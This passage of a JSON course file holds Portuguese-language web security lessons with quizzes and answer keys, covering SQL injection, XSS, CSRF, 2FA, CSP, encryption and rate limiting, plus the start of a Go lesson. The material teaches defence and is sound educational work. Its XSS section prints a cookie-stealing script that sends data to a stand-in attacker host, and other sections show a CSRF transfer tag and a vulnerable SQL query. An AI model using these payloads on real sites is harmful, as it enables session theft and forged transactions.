            "scenario": "A auditoria de segurança da Shadow Grid detectou uma falha grave: o desenvolvedor concatenou a variável de e-mail com o operador + na string de busca.",
            "buggyCode": "function buscarUsuario(email) {\n  const query = \"SELECT * FROM users WHERE email = '\" + email + \"'\";\n  return db.execute(query);\n}",
            "expectedKeywords": [
              "db.execute(\"SELECT * FROM users WHERE email = $1\", [email]);"
            ],
            "forbiddenKeywords": [
              "WHERE email = '\" + email + \"'"
            ],
            "hint": "Substitua a concatenação direta por uma consulta parametrizada usando $1 como placeholder e passe [email] no array de parâmetros.",
            "solutionExplanation": "Vulnerabilidade erradicada! Ao parametrizar a busca com $1, qualquer payload malicioso digitado será tratado apenas como texto inofensivo."
          }
        ]
      },
      {
        "id": "sec-2",
        "title": "2. Blindagem de Aplicações: XSS & Hashing de Senhas",
        "description": "Impeça a injeção de scripts no navegador e proteja credenciais com algoritmos de hash como bcrypt.",
        "duration": 17,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🔒 XSS & Criptografia de Credenciais\n\nApós proteger a camada de banco de dados, devemos blindar a interface e o cofre de credenciais contra as duas técnicas mais comuns de roubo de sessão: **XSS** e **senhas vazadas**.\n\n---\n\n### 🕷️ O que é XSS (Cross-Site Scripting)?\n\nOcorre quando dados fornecidos por usuários são renderizados na tela sem sanitização, permitindo a execução de JavaScript malicioso no navegador de outras pessoas:\n\n```html\n<!-- Se o perfil do invasor for este payload: -->\n<script>fetch('https://hacker.io/steal?cookie=' + document.cookie)</script>\n```\n\nSe o site injetar esse texto usando `innerHTML` ou `dangerouslySetInnerHTML`, o script roda silenciosamente e envia os cookies da vítima direto para o servidor do hacker!\n\n**Como prevenir:**\n1. Sempre use `textContent` em vez de `innerHTML` no JavaScript nativo.\n2. Armazene tokens de autenticação em cookies com a flag **`HttpOnly`** (que impede que qualquer código JavaScript leia o cookie).\n\n---\n\n### 🔑 Nunca Salve Senhas em Texto Puro!\n\nSe o banco de dados for comprometido, senhas em texto puro expõem todos os usuários imediatamente. Também nunca use MD5 ou SHA256 puro (são rápidos demais e vulneráveis a tabelas de busca *Rainbow Tables*).\n\nA indústria exige **algoritmos com Salt e fator de custo** como **bcrypt** ou **Argon2**:\n\n```javascript\nimport bcrypt from 'bcrypt';\n\n// 1. Gerando o hash seguro com 12 rodadas de salt\nconst senhaDigitada = \"senha_secreta_123\";\nconst hashSeguro = await bcrypt.hash(senhaDigitada, 12);\n\n// 2. Comparando a senha informada no login com o hash do banco\nconst senhaValida = await bcrypt.compare(senhaDigitada, hashSeguro);\n```\n\n> **💡 Dica Pro:**\n> O *Salt* é uma sequência aleatória única adicionada à senha antes do hash. Ele garante que dois usuários com a mesma senha tenham hashes completamente diferentes no banco!\n\n> **⚠️ Armadilha Comum:**\n> Tratar criptografia reversível e hashing como a mesma coisa. Criptografia pode ser decodificada de volta; um Hash seguro é uma via de mão única matemática que nunca pode ser revertida.",
        "codeExample": "// Exemplo de Hash de Senha com Bcrypt\nimport bcrypt from 'bcrypt';\n\nexport async function registrarCadeteSeguro(email, senhaPlana) {\n  const SALT_ROUNDS = 12;\n  const hash = await bcrypt.hash(senhaPlana, SALT_ROUNDS);\n  \n  // Gravamos apenas o hash no banco, NUNCA a senha pura!\n  return await salvarNoBanco({ email, senha_hash: hash });\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual configuração de cookie do navegador é a mais eficaz para impedir que ataques do tipo Cross-Site Scripting (XSS) consigam roubar o token de sessão do usuário?",
            "options": [
              "Definir a cor do cookie como verde.",
              "Ativar a flag HttpOnly, tornando o cookie inacessível para leitura via scripts JavaScript (document.cookie).",
              "Reduzir o tamanho do cookie para menos de 10 bytes.",
              "Salvar o cookie na pasta de downloads do usuário."
            ],
            "correctIndex": 1,
            "explanation": "A flag HttpOnly instrui o navegador a anexar o cookie nas requisições HTTP, mas bloqueia terminantemente qualquer acesso a ele via document.cookie pelo JavaScript da página."
          },
          {
            "type": "fillblank",
            "title": "Verificando a Senha Criptografada",
            "instruction": "Preencha o método da biblioteca bcrypt utilizado para verificar se a senha digitada confere com o hash salvo.",
            "codeSnippet": "const ehValida = await bcrypt.{{metodo_comparacao}}(senhaDigitada, hashSalvo);",
            "blanks": [
              {
                "id": "metodo_comparacao",
                "placeholder": "método de comparação",
                "expectedValues": [
                  "compare"
                ],
                "hint": "Palavra em inglês que significa \"comparar\"."
              }
            ],
            "explanation": "Perfeito! bcrypt.compare() desfaz o salt e compara a senha em tempo constante, prevenindo inclusive ataques de temporização (Timing Attacks)."
          }
        ]
      },
      {
        "id": "sec-3",
        "title": "3. Ataques CSRF e Tokens Anti-Falsificação",
        "description": "Bloqueie requisições forjadas entre sites entendendo a mecânica do CSRF, cookies SameSite e tokens anti-CSRF.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🛡️ Ataques CSRF e Tokens Anti-Falsificação\n\nSetor de defesa tática em Shadow Grid! Um dos vetores mais sutis do OWASP Top 10 é o **CSRF** (*Cross-Site Request Forgery* ou Falsificação de Requisição Entre Sites).\n\n> **💡 O que é CSRF?**\n> É um ataque onde um invasor engana a vítima autenticada para que seu navegador execute uma ação não intencional em um aplicativo web onde ela já tem uma sessão ativa. O navegador anexa cookies de autenticação automaticamente, fazendo o servidor achar que a ordem partiu do próprio usuário!\n\n---\n\n### 🕵️ O Cenário de Ataque\n\nImagine que o cadete está logado no banco da frota (`nexusbank.io`). Ele visita um site malicioso que possui uma tag de imagem invisível:\n```html\n<!-- No site do invasor: -->\n<img src=\"https://nexusbank.io/transferir?destinatario=hacker&valor=1000\" style=\"display:none;\" />\n```\nO navegador do cadete tenta carregar a imagem enviando os cookies de sessão do `nexusbank.io`. Se a rota for vulnerável a requisições GET para ações críticas, a transferência ocorre sem consentimento!\n\n---\n\n### 🛡️ As Duas Grandes Defesas\n\n1. **Tokens Anti-CSRF (Padrão Sincronizado):** O servidor gera um token aleatório secreto para cada formulário. Quando o formulário é enviado, o servidor valida se o token confere:\n```javascript\n// Exemplo com o middleware csurf no Express\napp.post('/transferir', csrfProtection, (req, res) => {\n  // Se o token for inválido, a requisição é bloqueada imediatamente!\n  res.send('Transferência segura concluída!');\n});\n```\n\n2. **Atributo `SameSite` nos Cookies:** A blindagem mais moderna:\n```javascript\nres.cookie('sessao_id', 'token123', {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'lax' // ou 'strict': impede que o cookie seja enviado em requisições vindas de outros sites!\n});\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar o método HTTP `GET` para operações que alteram estado (como compras, exclusões ou transferências). O método `GET` deve ser estritamente seguro e idempotente (apenas leitura)! Ações devem ser sempre `POST`, `PUT` ou `DELETE`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Configure sempre `SameSite=Lax` ou `SameSite=Strict` em todos os cookies de autenticação.\n- Valide os cabeçalhos `Origin` e `Referer` no servidor backend para confirmar a proveniência da requisição.\n\n> **🛡️ Regra de Ouro:**\n> Nunca confie cegamente apenas na presença de um cookie: exija tokens anti-CSRF ou utilize cabeçalhos de autorização com tokens Bearer.",
        "codeExample": "// Configuração recomendada de cookie seguro\nres.cookie('token_sessao', token, {\n  httpOnly: true, // Impede leitura por scripts (mitiga XSS)\n  secure: true,   // Exige conexão HTTPS criptografada\n  sameSite: 'strict' // Bloqueia envio a partir de outros domínios (mitiga CSRF)\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual atributo de cookie moderno é a defesa de primeira linha para impedir que o navegador envie o cookie de sessão durante requisições disparadas por outros sites (mitigando CSRF)?",
            "options": [
              "domain=local",
              "sameSite=strict (ou lax)",
              "max-age=0",
              "path=/"
            ],
            "correctIndex": 1,
            "explanation": "O atributo SameSite restringe o envio de cookies para contextos do mesmo site, prevenindo o envio automático em requisições forjadas originadas de domínios externos."
          },
          {
            "type": "code",
            "instruction": "Escreva a configuração do atributo \"sameSite: 'strict'\" e \"secure: true\" dentro de um objeto literal de opções de cookie.",
            "initialCode": "const opcoesCookie = {\n  // Defina sameSite e secure aqui\n};",
            "expectedKeywords": [
              "sameSite: 'strict'",
              "secure: true"
            ],
            "hint": "Use: const opcoesCookie = {\n  sameSite: 'strict',\n  secure: true\n};",
            "solution": "const opcoesCookie = {\n  sameSite: 'strict',\n  secure: true\n};"
          }
        ]
      },
      {
        "id": "sec-4",
        "title": "4. Autenticação Moderna, Sessões e Multi-Fator (2FA)",
        "description": "Implemente fluxos de autenticação seguros com TOTP (Time-Based One-Time Password) e proteção contra força bruta.",
        "duration": 17,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🔐 Autenticação Moderna, Sessões e Multi-Fator (2FA)\n\nBlindagem biométrica em Shadow Grid! Em um mundo repleto de vazamentos de senhas e ataques de credential stuffing, senhas simples não são mais suficientes para proteger sistemas de defesa estelar.\n\n> **💡 O que é Autenticação de Múltiplos Fatores (MFA / 2FA)?**\n> A autenticação exige pelo menos 2 dos 3 fatores fundamentais:\n> 1. **Algo que você sabe** (sua senha mestra).\n> 2. **Algo que você tem** (seu smartphone gerando código TOTP ou chave física de segurança FIDO/YubiKey).\n> 3. **Algo que você é** (biometria facial ou impressão digital).\n\n---\n\n### ⏳ Como Funciona o Algoritmo TOTP (Google Authenticator)\n\nO TOTP (*Time-Based One-Time Password* - RFC 6238) gera códigos de 6 dígitos que mudam a cada 30 segundos usando uma fórmula matemática estelar:\n\n```\nCódigo = HMAC-SHA1(Chave_Secreta_Compartilhada, Janela_De_Tempo_Atual)\n```\n\nNão é necessário internet no smartphone! O servidor e o aplicativo de autenticação calculam o mesmo resultado matematicamente baseados no relógio sincronizado.\n\n```javascript\nconst speakeasy = require('speakeasy');\n\n// Validando o código de 6 dígitos digitado pelo usuário:\nconst verificado = speakeasy.totp.verify({\n  secret: usuario.segredo2FA,\n  encoding: 'base32',\n  token: codigoDigitado,\n  window: 1 // Aceita pequena margem de 30s de atraso no relógio\n});\n\nif (verificado) {\n  console.log('Autenticação de dois fatores aprovada!');\n}\n```\n\n---\n\n### 🚫 Bloqueio de Força Bruta (*Brute Force Protection*)\n\nNunca permita tentativas infinitas de senha! Limite com bloqueio exponencial:\n\n```javascript\nconst rateLimit = require('express-rate-limit');\n\nconst limitadorLogin = rateLimit({\n  windowMs: 15 * 60 * 1000, // Janela de 15 minutos\n  max: 5, // Bloqueia o IP após 5 tentativas falhas consecutivas\n  message: { erro: 'Muitas tentativas de login incorretas. Tente novamente em 15 minutos.' }\n});\n\napp.post('/api/login', limitadorLogin, processarLogin);\n```\n\n> **⚠️ Armadilha Comum:**\n> Revelar se o usuário existe em mensagens de erro de login (ex: \"E-mail não cadastrado\"). Atacantes usam isso para enumerar quais contas existem no sistema! Use sempre mensagens genéricas: *\"Credenciais inválidas. Verifique seu e-mail e senha.\"*\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Forneça Códigos de Recuperação (*Backup Codes*) quando o usuário ativa o 2FA para casos onde o aparelho é perdido.\n- Exija que o usuário confirme a senha atual antes de cadastrar uma nova senha ou desativar o segundo fator.\n\n> **🛡️ Regra de Ouro:**\n> O 2FA bloqueia mais de 99% dos ataques automatizados de sequestro de contas segundo dados oficiais do setor de inteligência.",
        "codeExample": "// Mensagem segura de falha de autenticação\nif (!usuarioValido || !senhaValida) {\n  return res.status(401).json({ erro: 'Credenciais inválidas.' });\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o aplicativo Google Authenticator consegue gerar os códigos de 6 dígitos do 2FA mesmo com o smartphone em Modo Avião sem internet?",
            "options": [
              "Porque o app se conecta via satélites militares.",
              "Porque o algoritmo TOTP deriva o código matematicamente a partir da chave secreta e da hora do relógio do aparelho, sem precisar de rede.",
              "Porque o app baixa todos os códigos dos próximos 10 anos previamente.",
              "Porque o Bluetooth do aparelho conversa com o servidor."
            ],
            "correctIndex": 1,
            "explanation": "O TOTP combina uma chave secreta estática com o timestamp atual do relógio local para calcular o código via HMAC, funcionando de forma 100% offline."
          },
          {
            "type": "code",
            "instruction": "Escreva a configuração de um objeto rateLimit com \"windowMs: 900000\" (15 min) e \"max: 5\" tentativas.",
            "initialCode": "const config = {\n  // Defina windowMs e max aqui\n};",
            "expectedKeywords": [
              "windowMs: 900000",
              "max: 5"
            ],
            "hint": "Use: const config = {\n  windowMs: 900000,\n  max: 5\n};",
            "solution": "const config = {\n  windowMs: 900000,\n  max: 5\n};"
          }
        ]
      },
      {
        "id": "sec-5",
        "title": "5. Cabeçalhos de Segurança HTTP e Content Security Policy (CSP)",
        "description": "Eleve a blindagem do navegador com Helmet, Content-Security-Policy, HSTS e prevenção contra Clickjacking.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🛡️ Cabeçalhos de Segurança HTTP e Content Security Policy (CSP)\n\nDefesa perimetral em Shadow Grid! O protocolo HTTP possui cabeçalhos específicos que transformam o navegador do usuário em um scanner ativo de defesa.\n\n> **💡 O que é o Content Security Policy (CSP)?**\n> O CSP é o cabeçalho de segurança mais poderoso da web moderna. Ele informa ao navegador exatamente de quais domínios fontes de scripts, imagens, fontes e estilos têm permissão para ser baixados e executados, neutralizando ataques de injeção como XSS.\n\n---\n\n### 🛡️ O Cabeçalho CSP em Ação\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self' https://scripts.nexus.io; img-src 'self' data:;\n```\n\nSe um invasor conseguir injetar `<script src=\"https://site-malicioso.com/roubar.js\"></script>`, o navegador se recusa a baixar o arquivo e emite um alerta de bloqueio de segurança imediato no console!\n\n---\n\n### 🧱 A Armadura Completa com `helmet` no Node.js\n\nA biblioteca `helmet` configura uma dúzia de cabeçalhos de segurança vitais com uma única linha:\n\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\napp.use(helmet()); // Ativa todos os cabeçalhos recomendados automaticamente!\n```\n\nCabeçalhos cruciais configurados pelo Helmet:\n1. **`Strict-Transport-Security` (HSTS)**: Força o navegador a se comunicar **exclusivamente via HTTPS**, impedindo ataques de downgrade Man-in-the-Middle (SSL Strip).\n2. **`X-Frame-Options: DENY`**: Impede que seu site seja embutido em `<iframe>` por sites de terceiros, neutralizando completamente o ataque de **Clickjacking**.\n3. **`X-Content-Type-Options: nosniff`**: Impede que o navegador tente \"adivinhar\" o tipo de arquivo (*MIME sniffing*), tratando arquivos apenas pelo Content-Type declarado.\n\n> **⚠️ Armadilha Comum:**\n> Habilitar CSP com a diretiva `'unsafe-inline'` ou `'unsafe-eval'` em `script-src`. Fazer isso anula praticamente toda a proteção contra XSS oferecida pelo CSP!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Remova o cabeçalho revelador `X-Powered-By: Express` (o Helmet faz isso por padrão) para não fornecer aos atacantes detalhes sobre a tecnologia do backend.\n- Teste a conformidade dos seus cabeçalhos no portal da comunidade [securityheaders.com](https://securityheaders.com) buscando nota A+.\n\n> **🛡️ Regra de Ouro:**\n> O navegador do cliente é seu aliado; dê a ele as instruções de segurança certas através dos cabeçalhos HTTP.",
        "codeExample": "// Ativação do Helmet no Express\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\napp.use(helmet());",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual ataque web é diretamente prevenido pelo cabeçalho HTTP \"X-Frame-Options: DENY\"?",
            "options": [
              "Injeção de comandos SQL no banco de dados.",
              "Clickjacking, onde o atacante embute o site legítimo dentro de um iframe invisível para interceptar cliques.",
              "Esgotamento de memória RAM no servidor.",
              "Varredura de portas via rede Wi-Fi."
            ],
            "correctIndex": 1,
            "explanation": "X-Frame-Options: DENY impede que a página seja renderizada dentro de frames ou iframes em outros domínios, bloqueando ataques de clickjacking."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução para importar o \"helmet\" e aplicá-lo como middleware global em um aplicativo \"app\" do Express.",
            "initialCode": "const express = require(\"express\");\nconst app = express();\n// Importe e ative o helmet aqui\n",
            "expectedKeywords": [
              "const helmet = require('helmet');",
              "app.use(helmet());"
            ],
            "hint": "Use: const helmet = require('helmet');\napp.use(helmet());",
            "solution": "const helmet = require('helmet');\napp.use(helmet());"
          }
        ]
      },
      {
        "id": "sec-6",
        "title": "6. Criptografia em Trânsito (HTTPS/TLS) e em Repouso",
        "description": "Proteja transmissões com TLS 1.3 e encripte dados confidenciais com cifras simétricas AES-256-GCM.",
        "duration": 17,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🔒 Criptografia em Trânsito (HTTPS/TLS) e em Repouso\n\nCofre quântico em Shadow Grid! Nenhum dado sensível pode transitar pela internet em texto claro (*plaintext*), nem pode repousar nos discos de servidores sem uma camada sólida de cifragem criptográfica.\n\n> **💡 Os Dois Estados dos Dados**\n> - **Dados em Trânsito**: Pacotes trafegando pela rede (protegidos por **HTTPS / TLS 1.3**).\n> - **Dados em Repouso**: Registros gravados no banco de dados ou arquivos no disco (protegidos por algoritmos como **AES-256**).\n\n---\n\n### 🌐 Criptografia em Trânsito com TLS 1.3\n\nO TLS (*Transport Layer Security*) combina:\n1. **Criptografia Assimétrica** (chaves pública e privada como RSA ou ECC): Usada apenas no aperto de mão inicial (*Handshake*) para autenticar o servidor e negociar uma chave temporária com segurança.\n2. **Criptografia Simétrica** (como AES-GCM): Usada para transferir os dados da requisição em altíssima velocidade utilizando a chave efêmera negociada.\n\n---\n\n### 🛡️ Criptografia em Repouso com `crypto` (AES-256-GCM)\n\nO modo GCM (*Galois/Counter Mode*) fornece **confidencialidade E autenticidade** (garante que ninguém adulterou o texto cifrado):\n\n```javascript\nconst crypto = require('crypto');\n\nconst ALGORITMO = 'aes-256-gcm';\nconst CHAVE_SECRETA = crypto.randomBytes(32); // Chave de 256 bits\n\nfunction criptografarTexto(textoClaro) {\n  const iv = crypto.randomBytes(12); // Vetor de Inicialização único\n  const cifrador = crypto.createCipheriv(ALGORITMO, CHAVE_SECRETA, iv);\n\n  let cifrado = cifrador.update(textoClaro, 'utf8', 'hex');\n  cifrado += cifrador.final('hex');\n\n  const tagDeAutenticacao = cifrador.getAuthTag().toString('hex');\n\n  return {\n    iv: iv.toString('hex'),\n    cifrado,\n    tag: tagDeAutenticacao\n  };\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Reutilizar o mesmo Vetor de Inicialização (`IV`) para encriptar múltiplos dados com a mesma chave! O IV deve ser aleatório e gerado novamente a cada nova cifragem.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Nunca desenvolva seus próprios algoritmos de criptografia caseiros (\"Don't roll your own crypto\"): use apenas primitivas padronizadas internacionalmente e testadas por matemáticos.\n- Armazene chaves mestras de criptografia em serviços especializados como AWS KMS, HashiCorp Vault ou Azure Key Vault.\n\n> **🛡️ Regra de Ouro:**\n> Dados vazados sem a chave criptográfica são apenas ruídos ininteligíveis para os invasores.",
        "codeExample": "// Geração segura de bytes aleatórios\nconst crypto = require('crypto');\nconst tokenSeguro = crypto.randomBytes(32).toString('hex');",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o modo AES-256-GCM é amplamente preferido em relação a modos legados como AES-CBC para criptografia de dados?",
            "options": [
              "Porque o AES-GCM não precisa de chaves secretas.",
              "Porque o AES-GCM é uma cifra autenticada (AEAD) que detecta qualquer tentativa de adulteração no texto cifrado através de uma tag de autenticação.",
              "Porque ele comprime arquivos de áudio.",
              "Porque ele roda em 8 bits."
            ],
            "correctIndex": 1,
            "explanation": "AES-GCM fornece criptografia autenticada (AEAD), garantindo tanto o sigilo quanto a integridade contra modificações maliciosas nos dados."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução do módulo nativo \"crypto\" do Node.js para gerar 32 bytes aleatórios criptograficamente seguros em formato hexadecimal na constante \"token\".",
            "initialCode": "const crypto = require(\"crypto\");\n// Gere o token de 32 bytes aqui\n",
            "expectedKeywords": [
              "const token = crypto.randomBytes(32).toString(\"hex\");"
            ],
            "hint": "Use: const token = crypto.randomBytes(32).toString(\"hex\");",
            "solution": "const crypto = require(\"crypto\");\nconst token = crypto.randomBytes(32).toString(\"hex\");"
          }
        ]
      },
      {
        "id": "sec-7",
        "title": "7. Proteção Contra Força Bruta e Rate Limiting",
        "description": "Mitigue ataques de negação de serviço e tentativas excessivas com algoritmos Token Bucket e express-rate-limit.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🛑 Proteção Contra Força Bruta e Rate Limiting\n\nParedão anti-bombardeio em Shadow Grid! Robôs automatizados e botnets disparam milhares de requisições por segundo para adivinhar senhas de cadetes, estourar limites de APIs ou sobrecarregar servidores de banco de dados. A defesa é o **Rate Limiting**.\n\n> **💡 O que é Rate Limiting?**\n> É uma técnica de controle de tráfego que impõe um limite máximo de requisições que um determinado cliente (identificado por IP, Token de API ou ID de usuário) pode realizar em um intervalo de tempo específico.\n\n---\n\n### 🚰 O Algoritmo Token Bucket (Balde de Fichas)\n\nPense em um balde que comporta no máximo 10 fichas:\n- A cada requisição feita pelo usuário, uma ficha é retirada do balde.\n- A cada segundo, uma nova ficha cai no balde automaticamente.\n- Se o balde estiver vazio, as próximas requisições são rejeitadas imediatamente com o código **HTTP 429 Too Many Requests**!\n\n---\n\n### 🛡️ Implementando com Express e Redis\n\nEm clusters de servidores profissionais, o controle de requisições deve residir em um banco em memória centralizado como o **Redis**:\n\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst RedisStore = require('rate-limit-redis');\nconst { createClient } = require('redis');\n\nconst redisClient = createClient({ url: process.env.REDIS_URL });\n\nconst limitadorGeral = rateLimit({\n  windowMs: 60 * 1000, // 1 minuto\n  max: 100, // Máximo de 100 requisições por minuto por IP\n  standardHeaders: true, // Retorna os cabeçalhos padrão RateLimit-*\n  legacyHeaders: false,\n  message: { erro: 'Limite de tráfego excedido. Aguarde 60 segundos.' }\n});\n\napp.use('/api/', limitadorGeral);\n```\n\n---\n\n### 📊 Cabeçalhos HTTP de Resposta 429\n\nUma API bem arquitetada informa ao cliente:\n- `RateLimit-Limit`: Total de requisições permitidas na janela.\n- `RateLimit-Remaining`: Quantas requisições ainda restam.\n- `RateLimit-Reset`: Em quantos segundos o contador será zerado.\n- `Retry-After`: Tempo de espera obrigatório antes de tentar novamente.\n\n> **⚠️ Armadilha Comum:**\n> Fazer rate limit baseado apenas no endereço `req.ip` quando o backend está atrás de um proxy reverso ou CDN (como Nginx ou Cloudflare). Se você não ativar `app.set('trust proxy', 1)`, o IP visto será o do próprio proxy, e todos os usuários legítimos serão bloqueados juntos!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Crie limites mais rígidos para rotas sensíveis (ex: máximo 5 tentativas em `/login`) e limites mais folgados para leitura de dados comuns.\n- Implemente listas de permissão (*Allowlists*) para serviços internos da frota e Webhooks de parceiros confiáveis.\n\n> **🛡️ Regra de Ouro:**\n> Toda API pública precisa de rate limiting para manter a disponibilidade e conter gastos com infraestrutura em nuvem.",
        "codeExample": "// Resposta padronizada de Rate Limit atingido\nres.status(429).json({\n  erro: 'Taxa limite excedida',\n  retryAfterSegundos: 30\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual código de status HTTP padrão da IANA deve ser retornado pelo servidor quando um cliente excede o número permitido de requisições por minuto?",
            "options": [
              "401 Unauthorized",
              "403 Forbidden",
              "429 Too Many Requests",
              "503 Service Unavailable"
            ],
            "correctIndex": 2,
            "explanation": "O código HTTP 429 Too Many Requests foi criado especificamente para sinalizar que o limite de taxa de requisições foi ultrapassado."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução do Express para responder uma requisição com status 429 e corpo json \"{ erro: 'Muitas tentativas' }\".",
            "initialCode": "// Escreva o comando res.status... aqui\n",
            "expectedKeywords": [
              "res.status(429).json({ erro: 'Muitas tentativas' });"
            ],
            "hint": "Use: res.status(429).json({ erro: 'Muitas tentativas' });",
            "solution": "res.status(429).json({ erro: 'Muitas tentativas' });"
          }
        ]
      },
      {
        "id": "sec-8",
        "title": "8. Princípio do Menor Privilégio e Auditoria DevSecOps",
        "description": "Estruture segurança contínua com SAST, análise de dependências npm audit e o Princípio do Menor Privilégio.",
        "duration": 17,
        "xpReward": 70,
        "language": "javascript",
        "content": "# 🔍 Princípio do Menor Privilégio e Auditoria DevSecOps\n\nMissão de graduação em Shadow Grid! A segurança cibernética moderna não é uma fase que acontece \"no fim do projeto\". Ela é integrada em cada commit, branch e deploy através da cultura **DevSecOps**.\n\n> **💡 O Princípio do Menor Privilégio (Principle of Least Privilege)**\n> Cada usuário, processo de software, banco de dados e chave de API deve ter acesso **apenas aos recursos estritamente necessários para desempenhar sua função**, e nada mais. Se um componente for comprometido, o dano fica contido no menor raio possível.\n\n---\n\n### 🛡️ O Princípio Aplicado na Prática\n\n- **No Banco de Dados:** A API que lê o feed de notícias não deve conectar usando o usuário `postgres` (superusuário). Crie um usuário com permissão apenas de `SELECT` na tabela `posts`.\n- **Em Chaves de API:** Conceda escopos pontuais em vez de tokens de administração com permissão total (*Full Access*).\n- **Em Containers:** Nunca execute processos com o usuário `root`.\n\n---\n\n### 🔬 Automação no Pipeline CI/CD com SAST e SCA\n\n1. **SCA (Software Composition Analysis):** Escaneia pacotes de terceiros em busca de vulnerabilidades conhecidas:\n```bash\n# Varredura nativa do ecossistema Node.js:\nnpm audit\n\n# Correção automática de pacotes vulneráveis seguros:\nnpm audit fix\n```\n\n2. **SAST (Static Application Security Testing):** Analisadores estáticos de código (como Snyk, SonarQube e Semgrep) que inspecionam o código-fonte em busca de falhas de lógica, segredos vazados (*hardcoded secrets*) e sanitização ausente.\n\n```yaml\n# Trecho de GitHub Actions DevSecOps\n- name: Auditoria de Segurança de Dependências\n  run: npm audit --audit-level=high\n\n- name: Varredura de Segredos com Gitleaks\n  uses: gitleaks/gitleaks-action@v2\n```\n\n> **⚠️ Armadilha Comum:**\n> Ignorar os alertas do `npm audit` ou colocar flags para silenciar os testes no CI. Um pacote de terceiros desatualizado com vulnerabilidade crítica é uma das portas de entrada mais comuns para invasões cibernéticas corporativas.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Pratique a modelagem de ameaças (*Threat Modeling*) antes de começar a escrever o código de novas arquiteturas.\n- Mantenha registros de auditoria imutáveis com logs de ações críticas (quem acessou, que horas e qual registro foi alterado).\n\n> **🛡️ Regra de Ouro:**\n> A segurança não é um produto ou uma ferramenta; é um processo contínuo de vigilância e melhoria.",
        "codeExample": "# Executando auditoria rigorosa no terminal\nnpm audit --audit-level=moderate",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em que consiste o \"Princípio do Menor Privilégio\" na arquitetura de segurança da informação?",
            "options": [
              "Dar a todos os funcionários acesso total ao banco para evitar bloqueios de trabalho.",
              "Conceder a cada processo, usuário ou serviço apenas os privilégios e acessos mínimos indispensáveis para a execução de sua tarefa.",
              "Desligar os firewalls durante o horário comercial.",
              "Usar senhas de apenas 4 caracteres para facilitar a digitação."
            ],
            "correctIndex": 1,
            "explanation": "O princípio preconiza restringir as permissões ao mínimo necessário, limitando severamente os danos causados caso uma credencial seja comprometida."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando de terminal do ecossistema Node.js para executar a auditoria de segurança de dependências instaladas.",
            "initialCode": "# Digite o comando de auditoria de pacotes aqui\n",
            "expectedKeywords": [
              "npm audit"
            ],
            "hint": "Use: npm audit",
            "solution": "npm audit"
          }
        ]
      }
    ]
  },
  {
    "id": "golang",
    "slug": "golang",
    "name": "Go",
    "planetName": "Núcleo Supersônico",
    "description": "A linguagem criada no Google para microsserviços ultrarrápidos, concorrência nativa e alta escala.",
    "icon": "🐹",
    "color": "#00ADD8",
    "language": "go",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "go-1",
        "title": "1. Simplicidade Supersônica: Tipos & Funções em Go",
        "description": "Conheça o design enxuto do Go, declaração rápida := e o padrão explícito de retorno de erros.",
        "duration": 15,
        "xpReward": 65,
        "language": "go",
        "content": "# 🐹 Simplicidade Supersônica no Núcleo Go\n\nBem-vindo ao **Núcleo Supersônico**, cadete! Quando os pioneiros da computação Ken Thompson e Rob Pike projetaram a linguagem **Go** (Golang) dentro do Google em 2009, o objetivo era claro: **eliminar o inchaço e a lentidão dos sistemas de grande escala**.\n\nGo é a linguagem que move as maiores ferramentas de infraestrutura do mundo moderno: **Docker, Kubernetes, Terraform e Prometheus** são todos escritos em Go!\n\n---\n\n### ⚡ Características Marcantes do Go\n\n1. **Compilação Relâmpago:** Compila diretamente para um binário executável nativo único sem runtimes externos pesados.\n2. **Sintaxe Limpa & Enxuta:** Não há classes, herança complexa nem exceções escondidas.\n3. **Declaração Curta com Inferência (`:=`):**\n   ```go\n   nomeNave := \"Gopher-1\" // Go já sabe que é do tipo string!\n   velocidadeDobra := 9.9\n   ```\n\n---\n\n### 🔀 Múltiplos Retornos & Tratamento Explícito de Erros\n\nEm Go, funções podem retornar múltiplos valores simultaneamente. Por convenção universal, o último valor retornado é o erro:\n\n```go\nfunc carregarSensor(id int) (string, error) {\n    if id <= 0 {\n        return \"\", errors.New(\"identificador de sensor inválido\")\n    }\n    return \"SENSOR_ONLINE\", nil\n}\n```\n\nPara tratar a chamada:\n```go\nstatus, err := carregarSensor(10)\nif err != nil {\n    log.Fatal(\"Falha crítica:\", err)\n}\nfmt.Println(\"Sensor pronto:\", status)\n```\n\n> **💡 Dica Pro:**\n> O compilador do Go é inflexível por design: se você importar um pacote ou declarar uma variável e não utilizá-la no código, o Go recusa-se a compilar! Isso mantém o código de produção impecavelmente limpo.\n\n> **⚠️ Armadilha Comum:**\n> Tentar usar o operador `:=` fora do corpo de uma função. No escopo global do pacote, deve-se usar a palavra-chave `var`.",
